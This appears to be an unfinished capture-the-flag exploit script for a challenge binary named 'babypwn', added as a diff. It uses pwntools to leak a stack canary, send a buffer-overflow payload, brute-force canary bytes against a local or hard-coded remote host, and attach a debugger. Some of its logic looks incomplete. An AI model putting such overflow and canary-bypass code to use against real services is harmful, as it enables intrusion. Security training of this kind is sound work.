@@ -1,0 +1,96 @@
+from pwn import *
+from termcolor import colored
+import time
+"""===============    Configuration    ================"""
+
+class Exploit():
+
+    recvMsgAdr = "0x080488b1"
+    sendMsgAdr = "0x08048907"
+    exitCmp    = "0x08048b57"
+    bytesToCanary = 40
+    def __init__(self):
+        self.pwnName = "babypwn"
+        self.local = True
+        self.host, self.port = '110.10.212.130', 8888
+        context.endian = 'little'
+        context.arch = 'i386'
+        context.os = "linux"
+        context.log_level = "DEBUG"
+        context.terminal = ['tmux', 'splitw', '-h']
+        self.binary = ELF(self.pwnName)
+        self.connect()
+        ################################################
+
+    def connect(self):
+        if self.local:
+            self.vp = process(["./" + self.pwnName, " %s"%self.port])
+
+            self.host = "localhost"
+            self.r = remote(self.host, self.port)
+
+        else:
+            self.r = remote(self.host, self.port)
+
+    def menu(self, choice):
+        self.r.recvuntil('> ')
+        self.r.sendline( str(choice))
+        time.sleep(0.1)
+        if choice == 3:
+            self.r.close()
+            self.r = remote(self.host,self.port)
+            print colored(self.vp.recv(), "red")
+
+
+    def getLeak(self):
+        self.menu(1)
+        #"Input Your Message : "
+        #49 is the lowest amount of a's to get the canary from strlen
+        data = 'A'*self.bytesToCanary
+        self.r.sendafter(': ', data)
+        self.r.sendafter(': ', str(data))
+        time.sleep(0.1)
+        leak = self.r.recvline().strip()
+        log.info(leak)
+
+        #The +1 and +3 is because u32 can take 4 arguyments
+        self.canary = u32("\x00"+leak[self.bytesToCanary+1:self.bytesToCanary+1+3])
+
+
+    def overflow(self):
+        #canary is checked at point offset 15-19
+        filler = 'a'*40
+        data = filler + p32(0xDEADBEEF)
+        #data = self.canary
+
+        #data=fit({},filler='ABCDEFHIJKLMNOPQRSTUVWYXZabcdefghijklmnopqrstuvwyxz', length=100)
+        self.r.sendafter(': ', str(data))
+        time.sleep(0.1)
+        self.r.recvline()
+
+    def bruteForceCanary(self):
+        #"Input Your Message : "
+        filler =fit({},filler='ABCDEFHIJKLMNOPQRSTUVWYXZabcdefghijklmnopqrstuvwyxz', length=100)
+        overFlow = 'A' *500
+        for x  in xrange(0xFF):
+            self.menu(1)
+            payload = filler + p32( self.canary + x) + filler
+            self.r.sendafter(": ", payload)
+            self.menu(3)
+
+    def checkStackCanary(self):
+        self.menu(1)
+        gdb.attach(self.r, execute="b *{}".format(
+            exp.exitCmp)
+        )
+        self.overflow()
+        self.menu(3)
+
+if __name__ == "__main__":
+    exp = Exploit()
+    #exp.checkStackCanary()
+
+    exp.getLeak()
+    exp.menu(3)
+
+
